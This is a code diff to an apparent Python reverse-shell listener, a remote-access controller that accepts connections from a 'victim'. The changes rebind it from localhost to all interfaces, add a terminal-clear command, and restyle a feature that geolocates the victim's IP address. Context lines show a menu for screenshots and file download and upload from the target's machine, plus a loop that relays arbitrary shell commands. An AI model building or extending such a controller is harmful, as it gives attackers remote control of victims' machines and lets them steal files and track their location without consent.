@@ -73,7 +73,7 @@ def Socket_Creation () :
 		s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		s.setblocking(1)
 		
-		Host = "127.0.0.1"
+		Host = "0.0.0.0"
 		Port = sys.argv[1]
 
 	except IndexError :
@@ -127,10 +127,12 @@ def Socket_Accept():
  
 		global Connection
 		global address
+		global Victim_Caller
  
 		Connection , address = s.accept()
 
-		print(green + "[Info] " + endc + "Connection From\033[92m {}\033[0m On Port\033[92m {} ".format(address[0] , address[1]) + endc)
+		Victim_Caller = green + "[Info] " + endc + "Connection From\033[92m {}\033[0m On Port\033[92m {} ".format(address[0] , address[1]) + endc
+		print(Victim_Caller)
 		print("")
 		time.sleep(0.5)
 		print(green + "<--[ " + endc + "Shell Activated" + green + " ]-->" + endc)
@@ -157,7 +159,7 @@ def Socket_Accept():
 
 
 def get_info_by_ip(ip):
-    print("INFO ABOUT IP:")
+    print( green + " [ ** INFO ABOUT IP ** ]" + endc ) 
     try:
         response = requests.get(url=f"http://ip-api.com/json/{ip}").json()
         data = {
@@ -173,9 +175,10 @@ def get_info_by_ip(ip):
             '[LON]': response.get('lon')      
         }
         for k, v in data.items():
-            print(f"{k}: {v}")
+            print(f"{green } {k} {yellow}: {v} {endc}")
 
-        if input("- are you show marker maps ?[Y/press]: ") in ["y" , "Y" , "yes" , "YES"]:
+
+        if input(green + "\n - are you show marker maps ?[Y/press]: "+ endc) in ["y" , "Y" , "yes" , "YES"]:
             lat = response.get('lat')
             lon = response.get('lon') 
 
@@ -189,6 +192,8 @@ def get_info_by_ip(ip):
         
     except requests.exceptions.ConnectionError:
         print("[!] Connection error")
+
+
 
 
 
@@ -217,6 +222,7 @@ def Send_Commands(Connection) :
 			print (green + "[+] screenshot   --> " + endc + "{ Take A Screenshot }" + endc)
 			print (green + "[+] download     --> " + endc + "{ Download Files From The Target's Machine }" + endc)
 			print (green + "[+] upload       --> " + endc + "{ Upload Files From The Target's Machine }" + endc)
+			print (green + "[+] clear        --> " + endc + "{ Clear Terminal }" + endc)
 			
 			print("")
  
@@ -531,13 +537,42 @@ def Send_Commands(Connection) :
 				print(red + "[!] Screenshot Is Not Saved " + endc)
 				
 			print("")
-		   
+		
+
+
+
+
+		elif Commands == "clear" :
+			if platform.system().startswith("Win") :
+				os.system("cls")
+
+			else:
+				os.system("clear")
+				
+
+			Banner()
+			print(green + "[*] " + endc + f"Started At {time.ctime()}")
+			time.sleep(0.5)
+			print(green + "[*] " + endc + f"Listening On {Port} ...")
+			print(Victim_Caller)
+			print("")
+			time.sleep(0.5)
+			print(green + "<--[ " + endc + "Shell Activated" + green + " ]-->" + endc)
+			time.sleep(0.5)
+			print(green + "<--[ " + endc + "Press help For Display All Commands" + green + " ]-->" + endc)
+			print("")
+
+			
+
+
+
 		else :
  
 			Connection.send(Commands.encode())
 			Output_Command = Connection.recv(208400).decode("utf-8")
 			Output_String = str(Output_Command)
 			print(Output_String , end = "")
+
  
 if __name__ == '__main__':
    
